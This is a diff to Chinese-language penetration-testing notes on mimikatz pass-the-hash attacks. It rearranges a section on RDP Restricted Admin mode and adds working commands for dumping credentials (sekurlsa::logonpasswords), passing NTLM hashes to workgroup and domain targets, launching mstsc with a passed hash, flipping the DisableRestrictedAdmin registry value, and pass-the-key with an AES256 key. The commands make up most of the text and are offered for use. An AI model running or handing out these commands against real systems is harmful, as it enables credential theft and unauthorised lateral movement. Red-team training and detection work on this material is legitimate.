@@ -239,18 +239,13 @@ lsadump::lsa /inject
 
 # PTH
 
-**相关文章**
-- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
-- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
-- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
-
 在对 Windows 系统进行渗透测试过程中，如果获取目标机器的系统权限，则可以通过 hashdump 的方式获取目标机器历史登录信息，包括用户名和用户明文密码或者用户 hash，如果无法直接获取目标用户明文密码，则可以通过 pth 的方式远程登录目标机器
+
+**受限管理模式**
 
 通过 pth 的方式远程登录有一个限制：受限管理模式(Restricted Admin mode)
 - Windows8.1 和 Windows Server 2012(R2)默认支持该功能
 - Win7 和 Windows Server 2008(R2)默认不支持该功能，需要安装补丁 KB2871997 和 KB2973351
-
-**开启受限管理模式**
 
 1. 安装补丁 KB3126593,其原理与下述的修改注册表的原理是一致的
     - https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-to-improve-credentials-pro
@@ -276,9 +271,7 @@ lsadump::lsa /inject
     New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0"
     ```
 
-**通过用户/Hash 进行远程登录**
-
-1. 使用攻击机自己的用户及 Hash 进行远程登录
+4. 使用攻击机自己的用户及 Hash 进行远程登录
     ```
     mstsc.exe /restrictedadmin
     ```
@@ -291,12 +284,26 @@ lsadump::lsa /inject
     REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
     ```
 
-2. 通过 pth 进行远程登录(cmd)
+
+**mimikatz进行哈希传递攻击PtH**
+
+1. (工作组)通过 pth 进行远程登录(cmd)
+
+    ```
+    mimikatz.exe privilege::debug
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希"
+
+    mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:192.168.1.1 /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+    ```
+
+2. (域)通过 pth 进行远程登录(cmd)
+
     ```
     mimikatz.exe privilege::debug
     mimikatz.exe sekurlsa::logonpasswords
 
-    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域(工作组则为.) /user:目标机器的用户名 /ntlm:用户名对应的hash"
+    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash"
 
     mimikatz.exe privilege::debug "sekurlsa::pth /user:win10 /domain:test.com /ntlm:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
     ```
@@ -304,10 +311,15 @@ lsadump::lsa /inject
 3. 通过 pth 进行远程登录(mstsc)
     ```
     # 管理员权限下执行以下命令:
-    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域(工作组则为.) /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
+    mimikatz.exe privilege::debug "sekurlsa::pth /domain:目标机器的域 /user:目标机器的用户名 /ntlm:用户名对应的hash /run:mstsc.exe /restrictedadmin"
     ```
 
     RDP 限制管理模式是建立在 Kerberos 基础上的。看一下网络流量，可以看到 RDP 客户端代表模拟的用户请求 ticket，这没有问题，因为我们只需要通过哈希来验证 Kerberos。
+
+**相关文章**
+- [mimikatz-pth with rdp](http://rtshield.top/2019/08/31/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7-mimikatz-pth_with_rdp/)
+- https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth
+- [Passing the hash with native RDP client (mstsc.exe)](https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
 
 ---
 
@@ -410,5 +422,9 @@ kerberos::ptt test.kiribi
 ```
 mimikatz "privilege::debug" "sekurlsa::ekeys"
 
+# 注意查看 aes256_hmac 和 aes128_hmac
+
 mimikatz "privilege::debug" "sekurlsa::pth /user:test /domain:test.com /aes256:c4388a1fb9bd65a88343a32c09e53ba6c1ead4de8a17a442e819e98c522fc288"
 ```
+
+域控未打 KB2871997 补丁前，无法使用 Key 传递攻击
